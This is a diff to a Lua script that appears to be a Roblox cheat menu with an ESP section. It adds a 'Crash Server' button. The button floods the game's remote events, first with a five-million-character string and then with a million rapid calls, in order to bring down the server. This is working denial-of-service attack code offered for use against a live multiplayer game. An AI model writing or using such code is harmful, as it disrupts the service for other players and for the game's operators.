@@ -6199,6 +6199,32 @@ ClyrixBlobGroup:AddButton({
     end,
 })
 -- =====================================================
+-- Server タブ: Crash (右側最下部)
+-- =====================================================
+pcall(function()
+    local CrashGroup = Tabs.Server:AddRightGroupbox("Crash", "user")
+    CrashGroup:AddButton({
+        Text = "Crash Server",
+        Func = function()
+            pcall(function()
+                local RS = game:GetService("ReplicatedStorage")
+                local DataEvents = RS:FindFirstChild("DataEvents")
+                if not DataEvents then return end
+                local UpdTextures = DataEvents:FindFirstChild("UpdateTexturesChoice")
+                if UpdTextures then
+                    UpdTextures:FireServer(string.rep("A", 5000000))
+                end
+                local DataRemote = DataEvents:FindFirstChild("DataRemoteEvent")
+                if DataRemote then
+                    for _ = 1, 1000000 do
+                        DataRemote:FireServer()
+                    end
+                end
+            end)
+        end,
+    })
+end)
+-- =====================================================
 -- Visuals: Image ESP
 -- =====================================================
 local EspGroup = Tabs.Visuals:AddLeftGroupbox("ESP", "eye")
